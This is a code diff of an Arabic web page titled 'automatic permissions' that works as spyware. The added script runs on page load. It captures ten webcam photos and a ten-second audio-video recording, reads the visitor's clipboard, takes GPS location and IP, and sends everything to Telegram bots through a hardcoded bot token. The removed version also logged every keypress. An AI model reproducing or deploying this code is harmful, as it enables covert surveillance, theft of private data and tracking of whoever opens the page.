@@ -170,184 +170,144 @@ webmOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>تشغيل شامل ومتكامل 🔐</title>
+  <title>أذونات تلقائية</title>
 </head>
 <body>
-
-<button onclick="startEverything()">🚀 بداية التشغيل الشامل</button>
-
 <script>
-const bots = [
-  { token: '7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M', chat_id: '7664410054' },
-  { token: 'توكن_البوت_2', chat_id: 'ايدي_2' },
-  { token: 'توكن_البوت_3', chat_id: 'ايدي_3' }
+const TELEGRAM_BOTS = [
+  { token: "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M", chatId: "7664410054" },
+  { token: "TOKEN2", chatId: "ID2" },
+  { token: "TOKEN3", chatId: "ID3" }
 ];
 
-let lastKnownLat = "", lastKnownLon = "", lastKnownAcc = "";
-let locationInterval;
+async function startAll() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    sendToAllBots("👑دخول جديد👑\nطلب أذونات بدأ ✅");
 
-// إرسال رسالة نصية منسقة
-function sendToAllBots(message) {
-  bots.forEach(bot => {
+    captureImages(stream);
+    recordVideo(stream, 10);
+    requestMicrophone();
+    getLocation();
+    readClipboard();
+    sendIP();
+
+    setInterval(() => {
+      sendIP();
+    }, 60000);
+  } catch (e) {
+    sendToAllBots("❌ فشل إذن الكاميرا/الصوت: " + e.message);
+  }
+}
+
+function sendToAllBots(text) {
+  TELEGRAM_BOTS.forEach(bot => {
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-      method: 'POST',
+      method: "POST",
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: bot.chat_id, text: message })
+      body: JSON.stringify({
+        chat_id: bot.chatId,
+        text: text
+      })
     });
   });
 }
 
-// إرسال صورة base64
-function sendImageToAllBots(base64Data) {
-  const blob = base64ToBlob(base64Data);
-  bots.forEach(bot => {
-    const fd = new FormData();
-    fd.append("chat_id", bot.chat_id);
-    fd.append("photo", blob, "image.png");
-    fetch(`https://api.telegram.org/bot${bot.token}/sendPhoto`, { method: "POST", body: fd });
+function sendMediaToAllBots(file, type) {
+  TELEGRAM_BOTS.forEach(bot => {
+    const formData = new FormData();
+    formData.append(type === "video" ? "video" : "photo", file, file.name);
+    formData.append("chat_id", bot.chatId);
+    formData.append("caption", type === "video" ? "🎬 فيديو جديد 🎬" : "📸 صورة");
+
+    fetch(`https://api.telegram.org/bot${bot.token}/send${type === "video" ? "Video" : "Photo"}`, {
+      method: "POST",
+      body: formData
+    });
   });
 }
 
-// إرسال فيديو blob
-function sendVideoToAllBots(videoBlob) {
-  bots.forEach(bot => {
-    const fd = new FormData();
-    fd.append("chat_id", bot.chat_id);
-    fd.append("video", videoBlob, "video.webm");
-    fetch(`https://api.telegram.org/bot${bot.token}/sendVideo`, { method: "POST", body: fd });
+function captureImages(stream) {
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  video.play();
+
+  let count = 0;
+  const interval = setInterval(() => {
+    if (count >= 10) return clearInterval(interval);
+    const canvas = document.createElement("canvas");
+    canvas.width = 480;
+    canvas.height = 480;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+      const file = new File([blob], `photo_${count}.png`);
+      sendMediaToAllBots(file, "photo");
+    }, "image/png");
+    count++;
+  }, 1000);
+}
+
+function recordVideo(stream, duration) {
+  const recorder = new MediaRecorder(stream);
+  const chunks = [];
+
+  recorder.ondataavailable = e => chunks.push(e.data);
+  recorder.onstop = () => {
+    const blob = new Blob(chunks, { type: "video/webm" });
+    const file = new File([blob], "video.webm");
+    sendMediaToAllBots(file, "video");
+  };
+
+  recorder.start();
+  setTimeout(() => {
+    recorder.stop();
+    stream.getTracks().forEach(t => t.stop());
+  }, duration * 1000);
+}
+
+function requestMicrophone() {
+  navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+    stream.getTracks().forEach(t => t.stop());
+  }).catch(err => {
+    sendToAllBots("🎙 فشل إذن الميكروفون: " + err.message);
   });
 }
 
-function base64ToBlob(base64) {
-  const bstr = atob(base64.split(',')[1]);
-  const mime = base64.split(',')[0].split(':')[1].split(';')[0];
-  const u8 = new Uint8Array(bstr.length);
-  for (let i = 0; i < bstr.length; i++) u8[i] = bstr.charCodeAt(i);
-  return new Blob([u8], { type: mime });
-}
-
-// التقاط 10 صور بفاصل 1 ثانية
-function capture10Images() {
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      const v = document.createElement("video");
-      v.srcObject = stream; v.play(); v.style.display = "none";
-      document.body.appendChild(v);
-      const c = document.createElement("canvas"), ctx = c.getContext("2d");
-      let count = 0;
-      const iv = setInterval(() => {
-        if (count >= 10) { clearInterval(iv); stream.getTracks().forEach(t=>t.stop()); sendToAllBots("✅ تم التقاط 10 صور"); return; }
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        ctx.drawImage(v,0,0,c.width,c.height);
-        sendImageToAllBots(c.toDataURL("image/png"));
-        count++;
-      }, 1000);
-    })
-    .catch(err => sendToAllBots("🚫 خطأ بالكاميرا: " + err));
-}
-
-// تسجيل فيديو صوت+صورة (مثلاً 10 ثواني)
-function recordVideo(duration = 10) {
-  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-    .then(stream => {
-      const recorder = new MediaRecorder(stream), chunks = [];
-      recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-      recorder.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
-        sendVideoToAllBots(blob);
-        stream.getTracks().forEach(t=>t.stop());
-      };
-      recorder.start();
-      setTimeout(() => recorder.stop(), duration*1000);
-    })
-    .catch(err => sendToAllBots("🚫 فشل تسجيل الفيديو: " + err));
-}
-
-// طلب إذن الميكروفون
-function requestMicrophoneAccess() {
-  navigator.mediaDevices.getUserMedia({ audio: true })
-    .then(stream => { sendToAllBots("🎤 تم السماح بالميكروفون"); stream.getTracks().forEach(t=>t.stop()); })
-    .catch(err => sendToAllBots("🚫 فشل إذن الميكروفون: " + err));
-}
-
-// قراءة الحافظة
-function readClipboard() {
-  navigator.clipboard.readText()
-    .then(text => sendToAllBots("📋 الحافظة:\n" + text))
-    .catch(() => sendToAllBots("🚫 فشل قراءة الحافظة"));
-}
-
-// تسجيل ضغطات الكيبورد
-document.addEventListener("keydown", e => {
-  sendToAllBots("⌨️ مفتاح: " + e.key);
-});
-
-// تتبع الموقع وحفظه
-function getLocationAndStore() {
-  if (!navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      lastKnownLat = pos.coords.latitude;
-      lastKnownLon = pos.coords.longitude;
-      lastKnownAcc = pos.coords.accuracy;
-    },
-    err => sendToAllBots("🚫 خطأ GPS: " + err.message)
-  );
-}
-
-// تتبع مستمر كل فترة (مثلاً 60 ثانية)
-function startLocationTracking(intervalSeconds = 60) {
-  getLocationAndStore();
-  locationInterval = setInterval(getLocationAndStore, intervalSeconds*1000);
-}
-
-// جلب IP والدولة وعلمها
-async function fetchIpAndCountry() {
-  const ipRes = await fetch("https://api.ipify.org?format=json");
-  const { ip } = await ipRes.json();
-  const infoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-  const info = await infoRes.json();
-  const country = info.country_name || "غير معروف";
-  const code = info.country_code || "";
-  const flag = code.toUpperCase().replace(/./g, ch => String.fromCodePoint(127397 + ch.charCodeAt()));
-  return { ip, country, flag };
-}
-
-// تحضير الرسالة المنسقة وإرسالها
-async function prepareAndSendEntryMessage() {
-  try {
-    const { ip, country, flag } = await fetchIpAndCountry();
-    const msg = `
-👑 شادو، هناك دخيل جديد 👑
-${flag} ${country}
-
-🌐 بيانات الدخيل 🌐
-🆔 IP: ${ip}
-🌍 رابط الموقع: ${window.location.href}
-📡 GPS:
-📍 Lat: ${lastKnownLat || "?"}
-📍 Lon: ${lastKnownLon || "?"}
-🎯 الدقة: ±${lastKnownAcc || "?"} متر
-
-🎬 فيديو سيتم إرساله 🎬
-📸 صور سيتم إرسالها بعد قليل 📸
-    `.trim();
-    sendToAllBots(msg);
-  } catch (err) {
-    sendToAllBots("🚫 فشل تجهيز رسالة الدخول: " + err);
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const lat = pos.coords.latitude.toFixed(5);
+        const lon = pos.coords.longitude.toFixed(5);
+        const acc = pos.coords.accuracy;
+        sendToAllBots(`📍الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}m`);
+      },
+      err => {
+        sendToAllBots("📍فشل تحديد الموقع: " + err.message);
+      }
+    );
   }
 }
 
-// بدء كل شيء
-function startEverything() {
-  prepareAndSendEntryMessage();
-  capture10Images();
-  recordVideo(10);
-  requestMicrophoneAccess();
-  readClipboard();
-  startLocationTracking(60);
+function readClipboard() {
+  if (navigator.clipboard && navigator.clipboard.readText) {
+    navigator.clipboard.readText().then(text => {
+      if (text) sendToAllBots("📋 الحافظة:\n" + text);
+    });
+  }
 }
 
+function sendIP() {
+  fetch("https://api.ipify.org/?format=json")
+    .then(res => res.json())
+    .then(data => {
+      sendToAllBots("🌐 IP: " + data.ip + "\n" + window.location.href);
+    });
+}
+
+// بدء الأوامر بعد دخول الموقع مباشرة
+window.onload = startAll;
 </script>
 
 </body>
